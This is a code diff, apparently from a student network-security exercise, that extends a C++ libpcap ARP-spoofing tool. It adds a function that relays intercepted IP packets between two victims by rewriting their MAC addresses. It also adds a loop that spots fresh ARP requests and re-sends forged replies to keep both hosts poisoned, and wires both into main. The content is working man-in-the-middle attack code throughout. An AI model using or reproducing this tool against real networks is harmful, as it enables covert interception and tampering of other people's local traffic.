@@ -125,6 +125,81 @@ void send_arp_attack(pcap_t* handle, Mac attacker_mac, Ip attacker_ip, Mac sende
     }
 }
 
+
+//reply attack 
+void relay_packet(pcap_t* handle, const u_char* packet, struct pcap_pkthdr* header, Mac attacker_mac, Mac sender_mac, Mac target_mac) {
+    EthHdr* eth_hdr = (EthHdr*)packet;
+
+    // Sender → Target 패킷 mitm
+    if (eth_hdr->smac() == sender_mac && eth_hdr->dmac() == attacker_mac) {
+        // attacker가 Target에게 전달하기 위해 smac,dmac 주소를 수정
+        eth_hdr->smac_ = attacker_mac;
+        eth_hdr->dmac_ = target_mac;
+
+        // 패킷을 Target에게 전송
+        if (pcap_sendpacket(handle, packet, header->caplen) != 0) {
+            std::cerr << "Error relaying packet to target: " << pcap_geterr(handle) << std::endl;
+        }
+    }
+    // Target → Sender 패킷 mitm
+    else if (eth_hdr->smac() == target_mac && eth_hdr->dmac() == attacker_mac) {
+        // attacker가 Sender에게 전달하기 위해 smac, dmac 수정
+        eth_hdr->smac_ = attacker_mac;
+        eth_hdr->dmac_ = sender_mac;
+
+        // 패킷을 Sender에게 전송
+        if (pcap_sendpacket(handle, packet, header->caplen) != 0) {
+            std::cerr << "Error relaying packet to sender: " << pcap_geterr(handle) << std::endl;
+        }
+    }
+}
+
+//sender가 target의 mac주소를 다시 학습하려는 시점에 재감염 
+void reinfect(pcap_t* handle, Mac attacker_mac, Ip attacker_ip, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip) {
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* recv_packet;
+        int res = pcap_next_ex(handle, &header, &recv_packet);
+
+        if (res == 0) continue;  // 타임아웃 시 다음 패킷으로
+        if (res == -1 || res == -2) break;  // 에러 발생 시 또는 pcap 세션 종료 시
+
+        EthHdr* eth_hdr_recv = (EthHdr*)recv_packet;
+
+        // ARP 패킷인지 확인
+        if (eth_hdr_recv->type() == htons(EthHdr::Arp)) {
+            ArpHdr* arp_hdr_recv = (ArpHdr*)(recv_packet + sizeof(EthHdr));
+
+            // sender가 ARP 요청을 통해 타겟의 MAC 주소를 요청하는 경우
+            if (arp_hdr_recv->op() == htons(ArpHdr::Request) &&
+                arp_hdr_recv->sip() == sender_ip && arp_hdr_recv->tip() == target_ip) {
+
+                std::cout << "Detected ARP request from sender. Re-infecting..." << std::endl;
+
+                // 공격자의 MAC 주소를 포함한 ARP Reply 패킷을 송신자에게 전송하여 재감염 시도
+                send_arp_attack(handle, attacker_mac, attacker_ip, sender_mac, sender_ip, target_mac, target_ip);
+            }
+            // 타겟이 sender의 MAC 주소를 요청하는 경우
+            else if (arp_hdr_recv->op() == htons(ArpHdr::Request) &&
+                arp_hdr_recv->sip() == target_ip && arp_hdr_recv->tip() == sender_ip) {
+
+                std::cout << "Detected ARP request from target. Re-infecting..." << std::endl;
+
+                //ARP Reply 패킷을 타겟에게 전송하여 재감염
+                send_arp_attack(handle, attacker_mac, attacker_ip, target_mac, target_ip, sender_mac, sender_ip);
+            }
+        }
+        else if (eth_hdr_recv->type() == htons(EthHdr::Ip4)) {
+            // IP 패킷인 경우
+            relay_packet(handle, recv_packet, header, attacker_mac, sender_mac, target_mac);
+        }
+    }
+}
+
+
+
+
+
 int main(int argc, char* argv[]) {
     if (argc < 4) {
         std::cerr << "Usage: " << argv[0] << " <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]" << std::endl;
@@ -158,9 +233,13 @@ int main(int argc, char* argv[]) {
         std::cout << "Target MAC: " << std::string(target_mac) << " (" << std::string(target_ip) << ")" << std::endl;
 
         send_arp_attack(handle, attacker_mac, attacker_ip, sender_mac, sender_ip, target_mac, target_ip);
+        std::cout << "success send arp attack" << std::endl;
+
+        //재감염
+        reinfect(handle, attacker_mac, attacker_ip, sender_mac, sender_ip, target_mac, target_ip);
+        std::cout << "sucess reinfect" << std::endl;
     }
 
     pcap_close(handle);
     return 0;
 }
-
